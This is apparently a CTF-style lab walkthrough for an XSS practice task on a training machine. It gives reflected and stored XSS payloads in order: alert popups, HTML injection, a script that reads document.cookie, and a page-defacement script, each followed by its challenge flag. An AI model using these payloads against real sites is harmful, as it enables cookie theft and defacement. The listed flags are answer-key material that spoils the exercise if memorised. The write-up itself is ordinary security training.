# Task 20

### Navigate to [http://10.10.172.84/](http://10.10.172.84/) in your browser and click on the "Reflected XSS" tab on the navbar; craft a reflected XSS payload that will cause a popup saying "Hello". <a href="#navigate-to-http101017284-in-your-browser-and-click-on-the-reflected-xss-tab-on-the-navbar-craft-a-r" id="navigate-to-http101017284-in-your-browser-and-click-on-the-reflected-xss-tab-on-the-navbar-craft-a-r"></a>

On input search

```javascript
<script>alert(“Hello”)</script>
```

#### Answer <a href="#answer" id="answer"></a>

ThereIsMoreToXSSThanYouThink

### On the same reflective page, craft a reflected XSS payload that will cause a popup with your machines IP address. <a href="#on-the-same-reflective-page-craft-a-reflected-xss-payload-that-will-cause-a-popup-with-your-machines" id="on-the-same-reflective-page-craft-a-reflected-xss-payload-that-will-cause-a-popup-with-your-machines"></a>

```javascript
<script>alert(window.location.hostname)</script>
```

#### Answer <a href="#answer-1" id="answer-1"></a>

ReflectiveXss4TheWin

### Now navigate to [http://10.10.172.84/](http://10.10.172.84/) in your browser and click on the "Stored XSS" tab on the navbar; make an account. Then add a comment and see if you can insert some of your own HTML. <a href="#now-navigate-to-http101017284-in-your-browser-and-click-on-the-stored-xss-tab-on-the-navbar-make-an" id="now-navigate-to-http101017284-in-your-browser-and-click-on-the-stored-xss-tab-on-the-navbar-make-an"></a>

```html
<h1>this is an HTML tag </h1>
```

#### Answer <a href="#answer-2" id="answer-2"></a>

HTML\_T4gs

### On the same page, create an alert popup box appear on the page with your document cookies. <a href="#on-the-same-page-create-an-alert-popup-box-appear-on-the-page-with-your-document-cookies" id="on-the-same-page-create-an-alert-popup-box-appear-on-the-page-with-your-document-cookies"></a>

```javascript
<script>alert(document.cookie)</script>
```

#### Answer <a href="#answer-3" id="answer-3"></a>

W3LL\_D0N3\_LVL2

### Change "XSS Playground" to "I am a hacker" by adding a comment and using Javascript. <a href="#change-xss-playground-to-i-am-a-hacker-by-adding-a-comment-and-using-javascript" id="change-xss-playground-to-i-am-a-hacker-by-adding-a-comment-and-using-javascript"></a>

Find the ID of the XSS playground element

<figure><img src="../../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>

```javascript
<script>document.querySelector('#thm-title').textContent = 'I am a hacker'</script>
```

#### Answer <a href="#answer-4" id="answer-4"></a>

websites\_can\_be\_easily\_defaced\_with\_xss
